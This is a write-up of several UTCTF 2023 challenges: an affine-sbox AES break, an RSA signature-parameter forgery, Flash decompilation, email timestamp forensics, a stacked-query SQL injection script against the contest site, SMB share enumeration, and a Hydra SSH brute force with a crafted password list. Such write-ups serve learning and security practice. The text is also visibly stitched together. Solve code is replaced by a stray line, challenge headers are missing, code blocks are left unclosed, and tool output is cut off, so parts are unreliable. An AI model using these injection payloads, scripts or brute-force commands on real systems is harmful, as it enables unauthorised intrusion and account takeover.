As soon as I read the title and the description of the challenge, I immediately thought of an implementation of AES with affine sbox and the related attack that I had already seen in a previous ctf. The source code confirmed my hypotesis:
```python
    sbox = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]
```
I will briefly try to explain how the attack works (referring to [this](https://crypto.stackexchange.com/questions/20228/consequences-of-aes-without-any-one-of-its-operations/70107#70107)), but please have mercy, I'm not a mathematician.

![Me doing math](/assets/img/UTCTF_2023/chill-math.gif){: .image-50 }

In the AES encryption we have 3 operations: Sub_bytes, Mix_columns, Shift_rows. The last two are linear transformations, but Sub_bytes is not. Then we also have for each AES round an AddRoundKey operation which is just a vector addiction. Constant addiction and linear transformations are both affine transformations.
Therefore Sub_bytes it is the only thing that prevents AES from being linear and, consequently, affine. \\
How can we verify if the Sub_bytes operation is linear? We need to check if the sbox is linear. In this challenge is trivial, but generally we can check that the following equation holds:

$$
Sbox[x] \oplus Sbox[y] = Sbox[x \oplus y] \oplus c
$$

for any x and y, with c constant. In this challenge we have that:

$$
Sbox[x]=x \Rightarrow Sbox[x] \oplus Sbox[y] = x \oplus y = Sbox[x \oplus y]
$$

Which is valid for every x and y, with constant c=0.  \\
Now how the affinity of AES helps us to break it? The affine transformation of the affine AES is $c = Ap \cdot k$ where `p` is the plaintext input (a vector of 128 bits), `c` is the corresponding ciphertext output, `k` is a constant vector (depends on the key) and `A` is a 128 × 128 bit matrix. It turns out the if AES is affine `A` can be precomputed so the only unknown in the previous equation is `k`. \\
We only need a single known plaintext/ciphertext block pair `(p,c)` to be able to determine `k` ($k = c − Ap$) and decrypt/encrypt whatever we want. Luckily the challenge let us encrypt arbitrary text so it's not difficult to find such a pair `(p,c)`. The following is the implementation of the attack I used, I apologize for my lazyness but I recycled the script made by the creator of a similiar challenge ([credits to him](https://github.com/SunshineCTF/SunshineCTF-2022-Public/tree/master/Crypto/AESChall)).

print('[flag]')
```

At the beginning I felt a bit overwhelmed by all these functions and I started to analyze them and think to complex mathematical solutions.

![Me doing math again](/assets/img/UTCTF_2023/doggo_math.gif){: .image-50 }

After a while I realized that the solution might have been simpler than I thought. \\
If we think about it, the only thing that matters is that our provided input passes the check function:

```python
def check(array, mod, width):
    for x in array[0]:
        if not (x < 4 * width or mod-x < 4 * width):
            return False
    return True

.
.
.

if check(mat_mul(secret_key, keys[index], mod), mod, width)
```

More precisely we want that our input vector multiplied by a matrix passes the check. Lets try to simplify the logic of the check function:

```python
if not (x < 4 * width or mod-x < 4 * width)
```

This means that if one of the condition inside the parenthesis is true than the argument of the if is false and therefore we win! The parameters width and mod are fixed (=6 and  =10**9+7 respectively) so we only need to have that one of these 2 costraints is always true:

```python
x < 24
(1000000007-x) < 24
```
So we need that the elements of the result of `our_input * matrix` are all lower than 24 or higher than 1000000007-24. The first solution that came up in my mind was to provide as input vectors of zeros to make the result of the matrix multiplication always zero, therefore < 24.

```python:solve.py
from pwn import *

r = remote('puffer.utctf.live', 8484)
logger = log.progress('Round')

for i in range(10):
    logger.status(str(i))
    r.sendlineafter(b')\n', b'1')
    r.sendlineafter(b')\n', b'1')
    payload = b'0 '*(10*min(i+1, 5)+1)
    r.sendlineafter(b')\n', payload)

r.interactive()

The following is the code of the challenge:
```python:source.py
    #!/usr/local/bin/python

    from cryptography.hazmat.primitives.asymmetric import rsa
    from secrets import randbits

    if __name__ == '__main__':
        alice = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        print("Alice's pk: ", alice.public_key().public_numbers().n, alice.public_key().public_numbers().e)
        m = randbits(256)
        s = pow(m, alice.private_numbers().d, alice.public_key().public_numbers().n)
        print(m, s)
        print("Your key: ")
        n_prime = abs(int(input("n': ")))
        e_prime = abs(int(input("e': ")))
        d_prime = abs(int(input("d': ")))

        # Checks
        x = randbits(256)
        assert alice.public_key().public_numbers().n != n_prime or alice.public_key().public_numbers().e != e_prime
        assert n_prime > s
        assert pow(x, e_prime * d_prime, n_prime) == x
        assert e_prime > 1
        assert pow(s, e_prime, n_prime) == m

        with open('flag.txt', 'r') as f:
            print("Flag: " + f.read().strip())
```

The goal of the challenge is to find some "equivalent" parameters for the RSA signature wrt to the ones used by the server. We are asked to provide `N`, `e`, `d` such that:

$$
\displaylines{
	s^e \equiv m \pmod{n} \\
	x^{ed} \equiv x \pmod{n} \\
	n>s
}
$$

When I approached the challenge I didn't have clear ideas on how to solve it so I started trying some bruteforces to find the paramters. Obviously not a smart move. \\
After a few tries I took a small break from the challenge (always the turning point for me) and while I was doing something else I came up with a good idea.
We can notice that there are no constraints on the composition of `n`, therefore it may not be the product of 2 primes. So I used a [smooth number](https://en.wikipedia.org/wiki/Smooth_number), in particular the power of a small prime, as `n`. In this way it is really easy to compute the discrete logarithm modulo `n` using the Pohlig Hellman algorithm. At this point I only needed to compute the discrete_log of `m`  with base `s` to find `e` and then recover the respective `d`. \\
This procedure is not always successful for two reasons:
- The discrete_log(m, s) may not exist
- The obtained `e` can be not invertible modulo `phi(n)`, i.e. it's impossible to get `d`

Despite this the probabilties of success are still really high, and it is sufficient to run the solve script multiple times to obtain the flag.

```python:solve.py
    from pwn import *
    from sage.all import *

    while True:
        try:
            r = remote('puffer.utctf.live', 52548)

            r.recvline()
            data = r.recvline().strip().decode().split()
            m = int(data[0])
            s = int(data[1])

            # n crafting
            prime = random_prime(2**10)
            n = prime**250
            while n < s:
                n *= prime

            s = Mod(s, n)
            # this discrete log may not exist
            e = discrete_log(m, s)
            phi = euler_phi(n)

            # if this is not true the inverse of e doesn't exist
            assert gcd(e, phi) == 1

            d = pow(e, -1, euler_phi(n))

            r.sendlineafter(b': ', str(n).encode())
            r.sendlineafter(b': ', str(e).encode())
            r.sendlineafter(b': ', str(d).encode())
            r.interactive()
            r.close()
            break
        except:
            pass
```

# Reverse

## Game

This reverse challenge is very easy and challenging if you never decompiled a flash file. Analyzing the program with the file command we get: `Macromedia Flash data (compressed), version 10`.
We can quickly try using strings to find the flag, but with no success since a flash file is compiled and not just packed.

We need to find a swf decompiler, my choice was [jpexs-decompiler](https://github.com/jindrapetrik/jpexs-decompiler).

By opening the swf file with jpexs we clearly find out that the game isn't as simple as we hoped it would be (we could have also found out by the size of the file that is roughtly 8.8mb). I tried exporting all the folders of the program so i can explore all the files freely.

I found the flag in the folder texts. By running
```bash
$ cat *.txt | grep utflag
came from.utflag{flag}.Good news!
```
The flag is contained in the file `6283.txt`.

Looking at the file the first thing we will notice is:

> Date: Thu, 2 Mar 2023 03:12:42 +0000

But from the description we know that:

> Unfortunately, our Linux email server does not report receiving any emails on March 2, 2023.

So let's keep looking. Continuing to search, the Content-Type boundary and the Message-ID header jump to the eye, respectively:

> 00000000000093882205F60CDCDDB <br>
> CAODBzaAPrwTP=oDe6fkOv1a7LApXzv1m+YrYG9RHZM7tbBJRbw@mail.gmail.com

After some research we found [this site](https://www.metaspike.com/gmail-mime-boundary-delimiter-timestamps/) that talks about how timestamps can be derived from the boundary.

Proceeding with the steps indicated on the site we get ```0x05f60cdc938822``` which converted from hexadecimal to decimal from result ```1677909984249890```. Now using an online converter we get **03/04/2023 06:06:24.249890**.

# Web

## A tribute to Bataille

> Confess your sins!<br/><br/>
`http://guppy.utctf.live:5321` <br/><br/>
> You should confess your sins only when really needed.

The challenge is presented with a simple page with an image:

![img_name](/assets/img/UTCTF_2023/confess1.png){: .image-100 }

We can see that there are some injection already tried by other users.

In fact scrolling the page we can find a simple form which leads us to insert something and then submits the text to the page `/success`

Intercepting the request in burp and sending it returns the follow:

![img_name](/assets/img/UTCTF_2023/confess2.png){: .image-100 }

The page does not accept our text so the first idea is to check what characters are admitted:

```py:enumerate.py
import requests as r
import string

printable = string.printable
bad_response = "not a confession"
url = "http://guppy.utctf.live:5321/confess"

for x in printable:
    response = r.post(url,data={"confession":x})
    if bad_response not in response.text:
        print("Character " + x + " seems to be admitted")


```

The first result was the following:

```text
Character 1 seems to be admitted
Character 5 seems to be admitted
Character 6 seems to be admitted
Character 7 seems to be admitted
Character a seems to be admitted
Character b seems to be admitted
Character d seems to be admitted
Character h seems to be admitted
Character m seems to be admitted
Character s seems to be admitted
Character F seems to be admitted
Character Q seems to be admitted
Character S seems to be admitted
Character Y seems to be admitted
Character Z seems to be admitted
Character ! seems to be admitted
Character % seems to be admitted
Character ' seems to be admitted
Character + seems to be admitted
Character - seems to be admitted
Character / seems to be admitted
Character = seems to be admitted
Character ? seems to be admitted
Character @ seems to be admitted
Character [ seems to be admitted
Character \ seems to be admitted
Character ] seems to be admitted
Character ^ seems to be admitted
Character ` seems to be admitted
```

If we print the response for every character too, we get someghing like this:

```

thanks for confessing[]

```

So `[]` seems to be an empty array. Poking around for a little, we noticed that running again the *SAME* python script, we get different chars admitted:

```
Character 1 seems to be admitted
Character 4 seems to be admitted
Character 7 seems to be admitted
Character 9 seems to be admitted
Character b seems to be admitted
Character g seems to be admitted
Character h seems to be admitted

etc... etc...
```

Differently from before the char `1` is admitted but the `4` that was not in the first attempt now is accepted and instead the `5` is not allowed.

So the page seems to accept messages only sometimes, probably with a random choise from the beckend wich decides if accepting our submission or not.

So after some attempts of injects like  `';--"` we got no result.

By taking a deep look at the page, we noticed that the image is located under the path: `http://guppy.utctf.live:5321/images/img2.png`. The weird fact is that it is named as `img2.png` but no other images in the page are shown. By attempting to make a get request from the browser to check if exists another image with the name `img1.png` (`http://guppy.utctf.live:5321/images/img1.png`) we get another image:


![img_name](/assets/img/UTCTF_2023/confess3.png){: .image-100 }

And **BOOM!!**. It seems to be the code executed by the back-end application. Of course it is `python` so the web application is most probably using the framework `Flask`.

Ignoring this and taking a look at the code we can clearly see a code vulnerable to some kind of `SQL Injection` because no paramaterized queries are used. We're into an `INSERT` but we can see that multiples queries can be executed by adding a `;`, then the result is printed to the user as an array (The empyt array that we saw until now). Since the table name is `confessions`, we can try to inject something like this:

```
"); SELECT * FROM confessions WHERE text LIKE "utctf%"; -- abcd
```

But we have to remember that back-end accept only sometimes our requests, so we can build a script to make it:

```py
import requests as r
import string
import re
bad_response = "not a confession"
url = "http://guppy.utctf.live:5321/confess"

while True:
    to_inject = '"); SELECT * FROM confessions WHERE text LIKE "utflag{% raw  %}{%{% endraw %}"; -- abcd'
    response = r.post(url,data={"confession":to_inject})
    if bad_response not in response.text:
        print("The page returned the following result: ")
        flag = re.findall("utflag\{[a-zA-Z0-9_]{1,}\}",response.text)[0]
        print(flag)
        break
```

# Networking

## A Network Problem - Part 1

![netcat makes for an excellent stick](/assets/img/UTCTF_2023/networking_stick.jpg){: .image-50 }

Hi Wade! I am using socat to broadcat this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}

In case you prefer a fancier approach, nmap's version scan can also be abused for this kind of tasks:

## A Network Problem - Part 2

> betta.utctf.live has other interesting ports. Lets look at 8445 this time.<br><br>
> `betta.utctf.live:8445`

Now that we've developed a taste for fancy approaches, let's use nmap's version scan once more:

```plaintext
$ nmap -sV betta.utctf.live -p 8445

Starting Nmap 7.93 ( https://nmap.org ) at 1337-13-37 13:37 CET

Excellent, looks like we'll have to dig into a Samba share! Not a fast one though - but hey, what would you expect from good 'ole SMB?

Let's see if there are any shares that can be enumerated anonymously:

```plaintext
$ smbclient -p 8445 -L betta.utctf.live -U%

	Sharename       Type      Comment
	---------       ----      -------
	WorkShares      Disk      Sharing of work files
	BackUps         Disk      File Backups.
	IPC$            IPC       IPC Service (Samba Server)
SMB1 disabled -- no workgroup available
```

Get'em, `WorkShares` and `BackUps`.

```plaintext
$ smbclient -p 8445 //betta.utctf.live/BackUps -U%

tree connect failed: NT_STATUS_ACCESS_DENIED
```

The backup share may be out of scope for this challenge.

```plaintext
$ smbclient -p 8445 //betta.utctf.live/WorkShares -U%

Try "help" to get a list of possible commands.
smb: \> cd \shares\IT\Itstuff\

smb: \shares\IT\Itstuff\> exit
```

The other share seems freely accessible and after having poked around for a bit and having enjoyed some cat pictures, an unsuspecting text file contains sensitive data:

```plaintext
I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character?

In case you're more of a GUI person, the share could also be mounted and browsed through your favorite file manager.

## A Network Problem - Part 3

> We've gathered a lot of information at this point, let get access through ssh. (ignore port 22, use 8822)<br>
> (Use of brute force is permitted for this problem, but please set the wait time in hydra so you don't overwhelm the server)<br><br>
> `betta.utctf.live:8822`

---

**<u>Note:</u>** we didn't actually get the flag for this challenge even though we had solved it, since the server was constantly swamped by other players' attempts and we eventually moved on to more stimulating problems. This is one of the reasons why you don't design challenges around bruteforcing (unless they are backdoored, I guess?).

---

Given the clues found in Part 2 (`the magic phrase "abracadabra" [...] Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password [...] at least get them append a special character`) and the username format seen in Part 1 (`jwalker`), a list of usernames and passwords could be built trivially:

```plaintext
cball
wcoldwater
jwalker
hwood
```
```plaintext
abracadabra~
abracadabra`
abracadabra!
abracadabra@
abracadabra#
abracadabra$
abracadabra%
abracadabra^
abracadabra&
abracadabra*
abracadabra(
abracadabra)
abracadabra_
abracadabra+
abracadabra=
abracadabra{
abracadabra}
abracadabra[
abracadabra]
abracadabra|
abracadabra\
abracadabra;
abracadabra:
abracadabra'
abracadabra"
abracadabra<
abracadabra>
abracadabra,
abracadabra.
abracadabra?
abracadabra/
```

Running Hydra (albeit slowly, as the admins requested: `hydra -t 1 -W 0.1 -l users.txt -p passwds.txt -u -s 8822 betta.utctf.live ssh`) would have unveiled that the correct password for the user `wcoldwater` was `abracadabra$`, but unfortunately our timeslots didn't align with the server's availability.
